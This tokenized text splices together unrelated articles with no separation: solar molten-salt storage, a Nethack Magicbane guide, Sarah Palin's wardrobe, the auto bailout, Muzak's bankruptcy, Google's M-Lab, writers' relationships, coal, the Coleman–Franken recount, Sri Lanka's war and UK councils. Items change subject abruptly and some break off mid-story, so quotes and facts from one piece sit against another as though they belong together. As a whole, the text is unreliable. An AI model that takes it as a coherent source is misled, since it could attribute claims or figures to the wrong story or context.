" One of the great things about molten salt technology is that you can get more out of the pure solar resources , more energy out of the same facility , " says Barbara Lockwood , manager for renewable energy at APS .
" It 's an alternative that provides us with additional green energy , " as much as 1,680 megawatt - hours when cloudy or after sunset .
But that extra energy comes at a cost .
First , the power plant has to be enlarged so that it is both generating its full electrical capacity as well as heating up the salts .
In the case of Andasol 1 that meant covering 126 acres ( 50 hectares ) with long rows of troughs and pipe .
And then there is the additional expense of the molten salt storage tanks , according to Moormann .
All told , that means thermal energy storage at Andasol 1 or power plants like it costs roughly $ 50 per kilowatt - hour to install , according to NREL 's Glatzmaier .
But it does n't add much to the cost of the resulting electricity because it allows the turbines to be generating for longer periods and those costs can be spread out over more hours of electricity production .
Electricity from a solar - thermal power plant costs roughly 13 cents a kilowatt - hour , according to Glatzmaier , both with and without molten salt storage systems .
That price is still nearly twice as much as electricity from a coal - fired power plant — the current cheapest generation option if environmental costs are not taken into account .
But Arizona 's APS and others can then use solar energy to meet the maximum electricity demand later in the day .
" Our peak demand [ for electricity ] is later in the evening , once solar production is trailing off , " Lockwood says .
That 's " the reason we went that direction and are so interested in storage technology . "
As efficient as solar - thermal power plants using parabolic troughs with molten salt storage systems like Andasol 1 or Solana are , they do n’t capture as much of the sun 's heat as is possible .
Above 750 degrees F ( 400 degrees C ) , the synthetic oils used to capture the sun ’s heat in the troughs begin to break down , but the molten salts can take in much more heat than that .
To allow the salts to get hotter , some companies , such as SolarReserve in Santa Monica , Calif. , are developing so - called power towers — vast fields of mirrors that concentrate sunlight onto a central tower .
Because of the centralized design such a structure can operate at much higher temperatures — up to 1,000 degrees F ( 535 degrees C ) — and use molten salts directly as the fluid transferring heat in the power plant .
" We are heating the salts to more than 1,000 degrees F and that results in the same inlet conditions that utilities see today on a coal - fired or nuclear power plant , " says Terry Murphy , SolarReserve 's president .
But such a power plant — and Murphy says the company has some 50 such projects in the pipeline and expects at least one ( in the U.S. or Spain ) to be operating by 2013 — would cost as much as $ 800 million for a 200 - megawatt power tower .
" The first molten salt power tower built is going to be a real trial , " says Thomas Mancini , manager of Sandia 's Concentrating Solar Power Program .
" It 's going to take someone progressive enough to finance it or take a little more risk . "
So researchers are also looking into salts that could be used instead of the oil in parabolic trough power plants , such as those that melt at lower temperatures and therefore would not freeze as readily during cold nights , according to Hank Price , a vice president for technology development at Abengoa Solar .
Solar Millennium is working on such a salt , according to Moormann , and Sandia has developed small quantities of a new mixture of salts , including calcium nitrate and lithium nitrate , that melt below 212 degrees F ( 100 degrees C ) .
" With the lithium nitrate , it 's as expensive as all the other constituents combined .
Though still a lot cheaper than organic heat - transfer oils , " says chemical engineer Bob Bradshaw at Sandia in California , who is leading the research .
" You do n't get something for nothing . "
And long - term research projects are looking at other thermal storage technologies , such as storing heat in sand or creating single - tank molten salt storage .
" The main goal is to find a storage technology that may reduce the actual capital cost " of adding it to a power plant , says Phil Smithers , technical services leader for renewable energy at APS , which is researching those technologies under a U.S. Department of Energy grant .
Ultimately , it will come down to how much value policymakers and consumers put on electricity that is renewable and emissions - free .
" If we start valuing carbon and force a coal plant to go carbon - free via sequestration then we 're at or over 10 cents per kilowatt - hour from coal , " Mancini says .
" Any of these technologies can get to that same 10 cents level with [ molten salt ] storage .
Then the market will make the call . "
And should Andasol 1 spring a leak or otherwise fail to deliver as expected , the damage would not be confined to a pile of salt fertilizer on the ground — it could be a setback for the entire effort to store solar energy .
" We had to build the first [ commercial ] plant [ with molten salt storage ] and that 's what Andasol is , " Mancini says , in order to prove the technology .
" It does n't have to be perfect , but they 've got to make it work . "
Basically the only thing you need to win at Nethack is Magicbane , the swiss army dagger .
The rest will follow .
I ’ll tell you how to get it , what it does for you , and how to exploit its advantages .
How to get it :
Be a wizard .
You have to be a wizard because wizards automatically get Magicbane first when sacrificing corpses at altars .
If you bring a corpse to an altar ( they ’re underscores ) , or if you ’re standing on an altar while there ’s a corpse on it , you can #offer the corpse .
That occasionally makes good things happen , one of which is your god gives you an artifact weapon .
If you ’re a wizard , the first one he gives you is Magicbane .
Basically you just want to find an altar and sacrifice corpses at it until your god says “ Use my gift wisely . ”
That means he gave you Magicbane .
There are some issues with that .
Here they are , along with their solutions :
The alter has to be the correct alignment .
You ’re an elf wizard , if you ’re doing it right .
That means you ’re chaotic , so your god is Anhur .
The altar wo n’t give you Magicbane unless it ’s an Anhur altar .
You can convert any altar into an Anhur altar by sacrificing corpses at it , so still all you have to do is sacrifice corpses .
Your god wo n’t give you anything unless your alignment is high enough .
Your alignment goes up every time you sacrifice a corpse , so still , just sacrifice corpses .
You wo n’t get anything until you ’re at least level 4 .
You can get there pretty quickly just by killing monsters , which you ’re doing anyway .
So still , just kill and sacrifice them .
Their sacrifice is still increasing your alignment even though it ca n’t get you your dagger .
It takes a long time for the monsters to spawn .
Just wait for them .
If you get hungry , DO NOT eat the corpses .
Instead , just keep sacrificing them .
If you get weak from hunger , #pray .
Your god will fill your stomach .
When you do , your god goes into pout mode , from which he wo n’t give you magicbane or let you pray again .
Fortunately , that wears off in like 80 turns , and you can get it to wear off faster by – you guessed it – sacrificing corpses .
Waiting for a long time has only one other side effect ; you forget how to cast your spells after 20 k turns .
Do n’t worry – you can read the spellbooks 3 times to refresh your memory .
This whole process rarely takes that long , anyway .
If you hold down “ . ” to wait for monsters , they fly in and kill you while your character is still obeying your command to wait over and over .
Press “ n ” , then a number ( I use 999 ) , then “ . ” – this will do 999 “ rest ” commands in a row , but it will stop if you see a new monster ( or anything else happens . )
It ’s the safe way to hang around until a monster shows up .
The level with the altar may be full of twisty passages , and the monsters that spawn here can’t find their way to the altar .
Go down into the dwarven mines until you get a pick - axe or a broad pick .
Lug it back to the altar and drop it on the thing .
This will tell you if the pick is cursed .
If it ’s not , wield it .
You can now dig tunnels that the stupid AI pathfinding can use to go straight at the altar .
If you get to the dwarven mine town , there ’s always an altar there .
Unfortunately , 2/3 of the time it ’s not an Anhur altar .
Bad things happen if you try to convert it .
Find another altar .
Trying to convert an altar when there ’s a priest there will make the priest angry , and priests are really badass .
Also , do n’t sacrifice the corpses of elves , humans , black unicorns , or pets .
Various bad things happen when you do .
Also do n’t sacrifice the first floating eye corpse you find – you want to eat it .
It does a good thing .
What can Magicbane do for you ?
Oh man !
So manythings .
It ’s a dagger , which you , as a wizard , can become expert in .
Just use it .
When you see “ you feel more confident in your weapon abilities , ” use the #enhance command to get better .
When you hit monsters with it , it will often nail them with a status ailment , like stunning , confusion , or fear .
It also does some extra damage when it does this .
Do n’t enchant it past + 2 .
That decreases its chances of screwing with enemies .
Other than that , just enjoy the show .
It can ( E ) nscribe “ Elbereth ” in one turn with 100 % reliability , without wearing down the weapon .
Be an Elbereth slut .
Use it all the time .
The only monsters that will attack you when you ’re standing on Elbereth are elves and humans , and those are all passive by default .
Elbereth it up and everyone runs for the hills .
If you attack or cast spells from an Elbereth square , it ’ll wear Elbereth off after a couple turns , but there ’s nothing stopping you from re-inscribing it .
Also , it exercises your wisdom when you enscribe “ Elbereth ” exactly ( with the capitol E ) .
So do it a lot .
There ’s no downside .
It gives you the best intrinsic in the game , magic resistance , while you ’re wielding it .
You already had magic resistance from your cloak of magic resistance .
That means you can swap out your cloak for another one if you find it .
The cloaks you want are Robe , which makes you better at casting spells , and Cloak of Protection , which gives you better armor class .
You could also go with a cloak of invisibility for a while , but the first time you find a wand of Make Invisible , you should just zap yourself with that to make yourself permanently invisible .
This means you can never switch to another weapon if you want to keep magic resistance , but you never should anyway .
It absorbs 95 % of curses .
That only means the curses put on you by monsters that cast them at you , and curses that happen automatically intermittently when you have the amulet of yendor .
It does n’t save you from items that are already cursed .
There ’s really nothing to do differently other than maybe be less afraid of monsters with cursing attacks , but those rarely succeed anyway .
This is super helpful once you have the amulet , though , and there ’s no other way in the game to get this curse protection .

Now things are just getting weird .
Sarah Palin 's claiming she did n't spend $ 150 grand on wardrobe — evidence to the contrary be damned .
And that all this fuss is just an expression of sexism !
But the really strange part ?
Now some of the alleged retailers are claiming they never sold anything to the campaign .
So ... where did the money go ?
Who 's lying ?
And ... what the hell ?
In a rare interview with the Chicago Tribune yesterday , Palin asserted that she did not accept $ 150,000 worth of designer clothes from the Republican Party .
" That is not who we are , " she said .
" That whole thing is just , bad !
Oh , if people only knew how frugal we are .
It 's kind of painful to be criticized for something when all the facts are not out there and are not reported . "
Palin added that the clothes were bought for the Republican National Convention and that most of them have n't even left the plane .
So , wait ?
What " facts " is she talking about ?
Because she certainly has some pricey duds on , whatever 's in the plane .
The McCain campaign has released a statement claiming all clothes will be donated to charity , which pretty much seems to confirm that they did , in fact , buy them .
As Andrew Sullivan asks , " Is she saying they are not worth $ 150,000 ?
Is she saying they were bought at a second - hand charity shop ?
Or that they were hers to begin with ?
Is she saying that these clothes were all bought before the convention and only worn then ?
Is she saying that they have actually remained on the airplane the entire time and we have been hallucinating her wearing them at every occasion ?
Is she saying that the RNC did not buy them , or that no campaign money was spent on them ? "
Sullivan concludes it 's the blathering of a congenital liar who can't deal with reality , but it almost seems like it might be a case of folks not getting their stories straight .
From the get - go , fashion experts ( yeah , I know ) have stated that they did n't really see where all the money could have gone ; the clothes we 've seen are expensive , sure , but not that expensive .
And here 's where things get really murky : several of those stores where she was supposed to have spent the $ 150,000 deny having sold her anything .
Not only did a Minnesota children 's store deny having made a sale to Team Palin ( which listed it as an expense ) Quoth high - end men ’s store Atelier New York , where the campaign allegedly spent five grand .
presumably on the store 's avant - garde fashion ?
After going through the store 's receipts twice , the owner says , “ We have no recollection of that sale and no idea what they are talking about . ”
So , um , where did the money go then ?
And who 's lying ?
Everybody ?
Just somebody ?
And why ?
Well , if it did go to clothes , the issue may be a bigger one than just that of losing Main Street cred : Yesterday watchdog group Citizens for Responsibility and Ethics filed a complaint with the Federal Election Commission against Palin and the RNC , claiming that the use of campaign funds for personal use — read : clothing for Palin and her family — violates the Federal Election Campaign Act .
Palin 's response to all that ?
Apparently either a ) flat - out lying , b ) befuddlement c ) madness .
In any event , it 's all because she 's a woman and the sexist media 's subjecting her to unfair scrutiny , just like her sister - in - arms Hillary Clinton , and she really does n't want to talk about it so SHUTUPSHUTUPSHUTUP !
" I think Hillary Clinton was held to a different standard in her primary race , " Palin said .
" Do you remember the conversations that took place about her , say superficial things that they do n't talk about with men , her wardrobe and her hairstyles , all of that ?
That 's a bit of that double standard ... I 'm not going to complain about it , I 'm not going to whine about it , I 'm going to plow through that , because we are embarking on something greater than that , than allowing that double standard to adversely affect us , "

Yeah , so says the fair - weather feminist — who , as we know , has had to deal with having thousands of dollars ' worth of finery thrown upon her back by said sexist media .
Had she failed to notice that her makeup artist is paid better than any of the campaign 's policy advisors ?
That her campaign has n't exactly shied away from promoting her attractions ?
Palin's not wanting to address direct questions is hardly breaking news .
But large sums of campaign donations unaccounted for ?
Stories not adding up ?
Inconsistent records ?
Kinda is .
At best for the campaign , this is something ill - judged that 's been made a lot worse by double - talk , prevarications and concealment , tangled - web style .
At worst ?
Well , we do n't know about the money , but " worst " has kind of already happened so far as Sarah Palin is concerned — any vestige of credibility , dignity and gravitas has pretty much gone up in a blaze of mysteriously - funded , only okay - looking designer threads .
Never underestimate the power of clothes , people .

The latest from Detroit :
The price tag for bailing out General Motors and Chrysler jumped by another $ 14 billion Tuesday , to $ 39 billion , with the two automakers saying they would need the additional aid from the federal government to remain solvent .
….
The deteriorating finances of the two companies present the Obama administration with two options , neither of them appealing
It can provide the money in the hopes that the companies will stabilize , and no longer have to keep pushing workers into a growing pool of people without jobs … .
But if the federal government balks at the automakers ’ requests , that would mean the two companies probably would have no choice but to file for bankruptcy protection , because they are losing hundreds of millions of dollars each month .
Hell ’s bells .
What to do ?
I mean , does anyone believe this is the end of the bailout requests ?
I certainly do n’t , and I doubt anyone else does either .
On the other hand , the alternative is allowing GM and Chrysler to fail in the middle of a recession .
Nobody wants that .
But on the third hand , even if we bail them out , what are the odds that they can survive in the long term anyway ?
In the end , I suppose we ’ll continue bailing .
But this whole process shows up one of the big pitfalls of government action like this .
My own guess — and this is obviously just a personal hunch — is that while GM is at least arguably salvagable , Chrysler is a hopeless basket case .
So if we ’re going to do anything , we should probably bail out GM but let Chrysler go under .
That would save the taxpayers some money and reduce overcapacity in the auto industry at the same time .
Unfortunately , politics being what it is , the Obama administration probably feels like they can’t pick winners and losers and needs to treat them both equally .
This is almost certainly dumb , but it ’s what ’s most likely going to happen .
So the American public will end up pumping $ 10 or $ 20 billion into Chrysler in order to help it become , basically , the North American subsidiary of Fiat — a partnership that does the U.S. auto industry little good and will itself almost certainly crumble and fail before long in any case .
What a mess .

( CNN ) -- Muzak , the company that put pop , string - filled arrangements of rock songs in your elevator , filed bankruptcy papers Tuesday after it missed a $ 105 million payment to creditors .
The Muzak company is best known for background music piped into places such as elevators .
The pipeline of easy listening will continue to flow as Muzak restructures its debt during the Chapter 11 process , the company said .
" Muzak is a solid business with an outstanding customer base , but we are burdened with substantial debt obligations established over a decade ago , " Muzak CEO Stephen Villa said .
Muzak 's cash flows doubled in the last three years , Villa said , " demonstrating that our business continues to perform well even in today 's challenging environment . "
Along with its ubiquitous elevator offerings , Muzak and its 14 affiliates -- all privately owned -- produce on - hold messages and install sound systems , digital signs and drive - thru systems for retail businesses .
Bankruptcy documents showed Muzak owes its largest creditor -- U.S. Bank , as indentured trustee -- about $ 370 million , nearly all of it due this year .
Muzak spokeswoman Meaghan Repko said the filing was voluntary and in cooperation with the creditors .
The weakened global economy was not a factor , she said , noting the company 's profits have been rising in recent years .
The Chapter 11 protections will allow Muzak time to restructure the debt , which was incurred a decade ago , she said .
" Measure twice , cut once , " says the old carpenter 's adage , and what 's good for framing a house turns out to be important for tech policy as well .
Without better knowledge of what 's actually happening on the collection of networks we call the Internet , researchers and policy makers are operating from a position of ignorance .
But getting that sort of network data has , to date , been tough to do .
Google 's Vint Cerf , one of the men behind TCP / IP , hopes to make it easier .
Cerf Wednesday will announce at a Washington , DC event a new project launched by Google , the New America Foundation ( which Google supports ) , and PlanetLab ( which Google also helps support ) designed to make distributed network management easy to do , and the data from such projects easy to share .
Ars spoke with Google and the New America Foundation about the effort .
M- Lab
The initiative is called Measurement Lab , or M - Lab .
The idea began in 2008 , when Cerf and other Googlers began talking with academic researchers about problems that the researchers faced .
One of the biggest was one of the most obvious : doing network research requires widely distributed servers and huge amounts of user data in order to be meaningful .
Rolling out the server infrastructure that could support such tests was both expensive and difficult , and there was no central repository for sharing the massive data sets collected .
PlanetLab is an academic consortium that has worked to address these problems , and it runs an overlay network of servers across the US that can be used for network research .
But PlanetLab does n't guarantee that enough server bandwidth and processing power is actually available at any given time to run any given experiment —
M - Lab does so .
Because PlanetLab has extensive experience with the management aspects of such measurement servers , its software will power the M - Lab servers .
To start with , three such servers ( exclusive to M - Lab ) will reside in Mountain View .
By the end of 2009 , 36 servers will exist at 12 locations in the US and Europe , and M - Lab is open to participation from any other group that wants to host a site .
To do so , all that 's required is three dedicated rack - mount servers with dual quad - core processors each and a fast Internet connection .
Meet the tools
M - Lab will initially work with three tools ; two more are coming soon .
All tools must allow inspection of the source code , and all data generated from their use will enter the public domain .
M- Lab will also host this data and make it available to any researchers that want it .
Initial tools focus heavily on network openness .
Already up on the site is Glasnost , built by the Max Planck Institute for Software Systems in Germany , which can test whether BitTorrent is being blocked by a user 's ISP .
Coming soon are DiffProbe ( to " determine whether an ISP is giving some traffic a lower priority than other traffic " ) and NANO ( to " determine whether an ISP is degrading the performance of a certain subset of users , applications , or destinations " ) .
M - Lab has already used the recent news that Cox Cable will begin delaying traffic it deems not " time sensitive " during periods of congestions to talk up M - Lab 's usefulness ; DiffProbe and NANO will report this sort of degradation , even where ISPs do not announce it .
According to Google , though , the M - Lab platform is n't simply a way to advance Google 's goals like network neutrality .
M- Lab 's tool will also " help the public understand what they 're getting when they sign up for broadband , " and the tools can be used by ISPs to help diagnose user problems as they arise .
Tools can also be written by any research group and do not need to overlap with Google 's corporate goals to work with the M - Lab servers , and M - Lab has its own board ( most members come from academia ) .
Back to the future
Current research projects simply have a " massive shortcoming in data collection and analysis , " Sascha Meinrath of New America explained to Ars .
According to Meinrath , detailed network data about speeds , latency , jitter , and more used to be in the public domain until NSFnet was privatized in the earlier 1990s and the Internet as we know it today began its expansion .
Google 's offer of hardware and bandwidth is the " catalyst " that researchers need to break out of the " marginalized space " they have been crammed into ever since .
To turn M - Lab into a truly open and useful resource , the group is seeking help from anyone who can offer it — interface designers , network researchers , tool developers , and companies willing to host more servers .
Interface designers , especially , are needed if M - Lab 's work can translate into something that is also useful for end -users .
As it stands now , the site 's tools generally require the installation of Java applets and are not necessarily master classes in interface design and output presentation .
“ To my wife , who read all the drafts of my book .
I am the lucky beneficiary of not only her wise editorial comments , but her loving encouragement . ”
“ To my husband , whose generosity of spirit enables him to laugh at the irony that my writer ’s solitude has imposed a life of solitude on him too . ”
Ever notice how many volumes of poetry and prose these days are bookended by gushing dedications and acknowledgments like the fictional examples above ?
Writers outdo themselves in expressions of gratitude to their loved ones for their help and patience .
It ’s as if we ’re in the midst of a golden age of support — emotional anyway — for writers .
Unpublished writers , however , can be forgiven for wondering :
Do husbands , wives , and lovers like these really exist ?
Where are those who grumble about a writer ’s slim prospects for a payday ?
What ’s become of the Nora Joyce type , who makes no bones about a lack of confidence in the writer ’s work ?
Or the spouse or lover who , jealous that the writer has a calling , tries to hold him back .
It ’s not hard to understand why a writer rhapsodizes about his lover or spouse .
Aloft on the euphoria accompanying publication , all is forgiven .
Besides , where ’s the harm in tossing a few laurels in his direction ?
( Spanning genders , pronouns are masculine throughout .
Also , we ’ll call the unpublished writer ’s partner Blake . )
They might go a long way to eroding his resistance to the work the writer plans to put in on his next book .
Hey , whatever works .
But by failing to speak up about road blocks thrown in his path , a writer does a disservice to those who would follow in his tracks .
An unpublished writer ’s days are already dogged by disappointment .
Stumbling across dedications and acknowledgments like those above will just make him feel like he ’s the only writer bereft of a partner who ’s not only a patron of the arts , but a muse too .
By flaunting his felicitous choice in a mate , a published writer pours salt in the wounds of the unpublished writer , who thinks , if only my partner would stop bundling my dreams into the bath and turning a cold shower on them .
Among the problems
Blake can pose , perhaps the most formidable is objecting to the amount of time a writer spends writing .
There ’s no denying that when Blake threw his lot in with a writer he was in for a surprise .
His previous relationships might well have been a round of restaurants , films , and concerts , or , at home , watching movies and TV .
Aside from those who are studying for a degree , most men and women who have yet to start a family spend their evenings either out or unwinding at home .
Unless he ’s an artist as well , the first time Blake catches sight of the writer retreating to his computer , his heart sinks .
Does writing , Blake wonders , mean more to him than me ?
Following the advice , however well - meaning , of Beth Mende Condy on WriteFromHome.com —
“ You must declare to the world that .
. . you have the right to write ” — will only add fuel to the fire .
Of course , if the writer is paid , Blake cuts him some slack — or does he ?
We decided to give writers who have attained a degree of success their big chance to come clean .
We first asked them if they had ever experienced resentment in a relationship over the amount of time they spent writing .
Kim Addonizio , author of Little Beauties ( Simon & Schuster , 2005 ) reports that a man she lived with told her , “ I really should do more housework since I was home all the time . ”
Edward Falco , author of Wolf Point ( Unbridled Books , 2005 ) , says of his significant others : “ I have been in relationships when my significant other rebelled against the ways in which I prioritized writing . ”
Though he does n’t draw the conclusion himself , perhaps one form that rebellion took was the interruptions that he ’s found endemic to a writer ’s life , especially by “ someone who lives with you and knows that many of those hours .
. . are spent pacing around the room . ”
Poet Robert Earl Price Wise Blood ( Snake Nation Press , 2004 ) , also experienced resentment .
“ It took burning through several relationships before I realized that most writers probably need a partner with a life of their own . ”
( His wife is a visual artist . )
Christopher Klim , author of The Winners Circle ( Hopewell Publications , 2006 ) reports that he ’s been down the same road as Price .
He “ purposely married a strong and independent person who did n’t need me , but preferred to be around me . ”
Diana Abu -Jaber , author of The Language of Baklava ( Pantheon , 2005 ) , also married someone who “ was entirely supportive of my work and the time I put into writing .
He ’s always trying to help me find ways to get away and improve my focus . ”
In other words , a writer mired in a relationship in which his pursuit is not honored , or at least tolerated , would be advised to seek an escape route .
Some writers , however , seem to have been spared writer ’s resentment entirely .
Phyllis Tickle is the author of The Night Offices ( Oxford University Press , 2006 ) , the latest in a series of fixed - hour prayer manuals .
“ Writing certainly did not pay well enough in the beginning to support a household , ” she reports .
But her husband , Sam , “ supported my efforts at every turn . ”
Now that that Phyllis is the principal breadwinner , Sam does the housekeeping .
Demonstrating an outlook that no doubt helped attract such a supportive partner , she adds , “ It ’s all just an indivisible whole . ”
On the other hand , we must take care to refrain from reflexively painting lovers or spouses who are less than supportive , like Blake , as intolerant or immature .
He could just as easily be called practical .
After all , someone ’s got to keep an eye on the finances .
Purists , of course , maintain that a writer ’s true reward is the act of writing itself .
They fail to understand a key point :
Generating cash can be crucial to justifying the vast expanses of time to which a writer lays claim .
“ What most people do n’t get , ” Edward Falco said , “ is the kind of drive and dedication it takes simply to make the time to write . ”
However undeniable his calling , an unpublished writer is essentially a hobbyist , no better and no worse than someone who repairs to crafts or woodworking after dinner .
In fact , if the writer has children , he may find his writing district gerrymandered to near extinction .
It ’s not until dinner is done , the kitchen cleaned up , and he ’s finished helping the kids with the homework that he ’s free to escape to his own zone .
But wait .
There ’s a final hurdle to clear :
Blake is counting on time alone with him to catch up on the day .
Who can argue with that ?
It ’s just that fatigue is already breaching the perimeters of the writer ’s consciousness .
Worse , in what amounts to an admission that Blake ’s jealousy is warranted , the writer fears he ’s standing up his muse .
Will she ever return ?
Even a full - time writer may find himself in this predicament .
If he works past his day shift , he ’s liable to be met with the same resistance as the unpaid writer .
In his article , “ Into the Clear : Philip Roth ” from Reporting ( Alfred Knopf , 2006 ) , which was excerpted in Poets & Writers , David Remnick captures this dilemma with a quote from the great man himself .
( Overlook , for the moment , Roth ’s not - so - veiled swipe at his former wife . )
“ Usually , ” he said , “ I write all day , but if I want to go back to the studio in the evening , after dinner , I do n’t have to sit in the living room because someone else has been alone all day . ”
But , even yielding to Blake ’s need for his presence may not be the end of it .
If the writer is white - knuckling it , as they say in support groups , Blake will sense he ’s looking ahead to writing .
Their time together will have been poisoned .
However sympathetic we are to his plight , it ’s at this point that the frustrated writer must be taken to task .
What did he expect ?
After all , he does n’t want one of those passive typist types from an earlier era , does he ?
Besides , if Blake does n’t voice his objections , his resentment will only accumulate and , with a writer ’s luck , blow sky high just as the writer faces a deadline .
We asked writers if preoccupation was not only an occupational hazard , but a hazard to the health of their relationships .
Niala Maharaj , author of Like Heaven ( Random House , 2006 ) , responds : “ My boyfriend of nearly 10 years actually threw me out of his house because I was too preoccupied while writing Like Heaven . ”
Phyllis Tickle is “ not safe around sharp objects , ” according to her husband .
Conceding that , she adds : “ Any writer who says he or she does not move into another zone of consciousness when actively writing is just fooling him or herself . ”
His partner “ must accommodate to the realities and exigencies of the process . ”
Edward Falco says , “ A loved one has a right to have you present when together , not off thinking about invented characters .
But when you ’re working on a story , really working , the mind is going all the time , dreaming those characters , living their imagined lives . ”
Christopher Klim explains that his wife understands “ that ’s part of the artistic mind .
Whenever I gear up for a new novel or script , I go through periods of intense focus .
. . [ which ca n’t help but resemble ] self - absorption . ”
Then he adds , “ There are quirks about my spouse that must be honored .
It ’s the least I can do . ”
Robert Price , meanwhile , attempts to head the problem off at the pass .
He and his spouse “ maintain a genuine interest in each other and each other ’s work . ”
He has learned that “ we are both insecure . ”
Klim sums up .
“ There ’s nothing to prepare you for living with an artist , only a strong , self - affirmed , independent mind . ”
You can warn a young writer of the perils of pairing off with a partner from outside the arts all you want .
But a writer , often weighed down by an inferiority complex about his introspective ways , may be drawn to someone whose idea of an interior life is drapes , valences , and modular sofas .
The subsequent unhappy relationship may provide a young writer with choice material .
However , one who ’s in writing for the long haul soon wearies of the home as a battlefield .
He needs a refuge , in which , to paraphrase Wordsworth , he can recollect his conflicts in tranquility .
Is n’t there a tradition that he can fall back on , the young writer wonders , which entitles him to a certain amount of time ?
Are n’t there industry standards of some sort ?
Even suggested guidelines that he can present to Blake would be helpful .
Perhaps it ’s time that devising some became a project for writer ’s conferences .
In fact , why not comp Blake a free pass and invite his input ?
The results of these workshops would be aggregated at a conference of a group like the National Writers ’ Union , which exists , in part , to improve the working conditions of all writers .
A sample contract may then be drawn up .
Think of it as a variation on a pre-nup .
While distinctly un-romantic , it would help
Blake understand that time taken from the relationship is the only way for a writer –- or any artist , or even an entrepreneur — to take his shot at success .
In turn , Blake can rest assured that nether will he be short - changed .
In fact , he ’ll see many of his claims on the writer ’s time validated .
In the interim , the writer needs to understand that , when it comes to convincing Blake of his commitment to the relationship , nothing beats his full , undivided attention .
When Blake sees how present he is , he might learn to be content with less quantity .
In practice , the writer should count on at least half an hour of time alone evenings with Blake .
What about weekends ?
If time management is unexplored terrain to a writer , weekends are virgin territory that await mapping out .
No more than marriage vows , the proposed contract can’t guarantee you wo n’t end up just another lonely writer .
But what choice do we have other than to behave honorably ?
After all , is n’t empathy the currency of our realm ?
A writer who does n’t hold up his end of a relationship is at least at much at fault as a partner who fails to honor a writer ’s calling .
The beautiful photograph above is from the Associated Press .
Geese are soaring through smog emitted from a smokestack at the Jeffery Energy Center coal power plant in Emitt , Kansas .
The photo is from Saturday , January 10 , 2009 .
As pretty as the smoke looks in the picture , it is pure filth that is the " single greatest threat to civilisation and all life on our planet , " according to a James Hansen editorial in the Guardian .
Hansen has rung the bell on climate change for a long time now , he 's like the Nouriel Roubini of climate change , to put in terms that might help financial news readers .
In his piece , the long time critic of coal writes that increased carbon emissions will melt the ice caps and destroy hundreds of species .
He singles out coal saying it , " is polluting the world 's oceans and streams with mercury , arsenic and other dangerous chemicals . "
He adds , there is no such thing as clean coal .
Meanwhile , the New York Times , also examines the coal industry asking , " Is America Ready To Quit Coal ? "
The Times story points out that " 83 plants in the United States have either been voluntarily withdrawn or denied permits by state regulators .
The roughly 600 coal - fired power plants in the United States are responsible for almost one - third of the country ’s total carbon emissions ... " and there is a growing chorus of people disgusted with the pollution from coal .
As polluting as coal is right now , neither the Times , nor the Guardian makes a convincing case for an alternative solution .
The Guardian piece barely tries to outline a solution .
It covers the problems , but admits there is n't enough outrage amongst the public to force politicians to change business practices .
Based on reading Hansen 's previous writings , he wants a moratorium on building coal plants .
Also , improvements in building efficiency would help to keep energy demand flat over the next few years .
In that time there could be further research into renewable energies .
At the same time he'd like to update the electric grid , work nuclear power , and develop real carbon capture and sequestration .
The New York Times story points out that for all the frustration about the damage caused by coal , alternative energy sources are not ready to provide workable solutions to the worlds energy needs today .
Wind and solar are n't reliable providers of energy .
The technology to caputure their excess energy on sunny and windy days for cloudy still days is n't ready for primetime .
And the current electrical grid is n't able to transmit electricity from these sources to homes with ease .
There are a number of schemes being hatched to avoid pollutant energy like coal .
Unfortunately , they all rely on technology that is still far from development .
Department of Energy chief , Steven Chu , recently said solar energy needs to be five times more efficient than it currently is .
And he 's famous for calling coal a " nightmare . "
While coal might be a nightmare , it looks like it 's going to be a nightmare we live with for the next few years .
There are n’t a lot of investments paying good dividends these days .
But the Republicans have definitely found one : funding Norm Coleman ’s hopeless court suit to try to find some way to let him be senator again .
As a matter of principle , I do n’t really like when people try to shame candidates into throwing in the towel .
Elections are important ; candidates and supporters put immense energy , money and effort into winning them .
So as long as a candidate thinks he or she won , they should be free to pursue whatever remedies and legal avenues are available .
That said , it ’s worth considering what Republicans are getting — not by keeping Coleman ’s hopeless effort alive but far more importantly by delaying Al Franken ’s swearing in .
The Stimulus Bill battle is a good example .
The Dems needed Specter , Collins and Snowe to get the thing through .
With Franken they would have needed only two of those votes .
I do n’t know precisely what each of them wanted .
But I do n’t think there ’s much doubt that would have led to a less watered - down bill .
And it seems quite possible that that missing vote will play a similarly consequential role in the weeks ahead .
Perhaps in the months ahead .
The court process has to play itself out .
There ’s no way around that — though the judges seem ready to strangle Coleman .
But we could do with a little more recognition of the fact that this is not about getting Norm Coleman into the senate .
It ’s about paying money to give the Republicans a few more months of leverage against the Democrats 59 seat majority .
Many Sri Lankan civilians have been fleeing the conflict zone The United Nations says it has received reports that Tamil Tiger rebels are actively preventing civilians from leaving Sri Lanka 's war zone .
It says a growing number of those trying to leave have been shot at and some have been killed .
Tens of thousands of civilians are believed to be trapped after weeks of heavy fighting , mostly in a government " safe zone " along the north coast .
The Tigers have regularly denied claims they are using civilian human shields .
' Forcible recruitment '
A statement from the United Nations in Sri Lanka says its concern for the safety of civilians caught up in the fighting has been heightened by reports it has received over the past few days .
See map of the region Many of the reports are based on testimony from people who have managed to come out of the conflict zone , it says .
Please turn on JavaScript .
Media requires JavaScript to play .
It says that reports on Sunday indicated that there was fighting inside the government - designated " safe zone " .
The UN is calling on both sides to refrain from fighting in areas with large civilian concentrations .
UN spokesman Gordon Weiss also said the Tamil Tigers were trying to forcibly recruit people into their ranks , including children as young as 14 .
The army has continued to close in on rebel positions
The UN said one staff member had been forcibly recruited into the rebels and demanded his immediate release .
There has been no response from the Tamil Tigers to the latest reports but in the past they have said civilians are frightened and are seeking shelter from the rebels .
They have denied trying to prevent civilians leaving or shooting at them and say the military is constantly firing artillery shells into civilian zones .
On Monday the pro-rebel TamilNet accused the military of using cluster and incendiary bombs on civilian positions .
The government has always denied targeting civilians .
No independent journalists can reach the conflict zone so claims by either side cannot be independently verified .
About 50,000 soldiers are pressing the Tamil Tigers into a patch of north - eastern jungle after taking the key areas of Kilinochchi , Elephant Pass and Mullaitivu .
The government has rejected international calls for a ceasefire , demanding the rebels lay down their arms .
The Tigers have said they will not do so until they have a " guarantee of living with freedom and dignity and sovereignty " .

Social affairs correspondent , BBC News
The Equality Commission has conducted research into provision More than 100 councils could face legal action for not providing specialist support services for women affected by sexual violence .
Every year three million women in Britain become victims of rape or other forms of sexual abuse .
The Equality and Human Rights Commission says councils have a legal duty to provide support for victims and is threatening court action .
The Local Government Association said the threats were " irresponsible " .
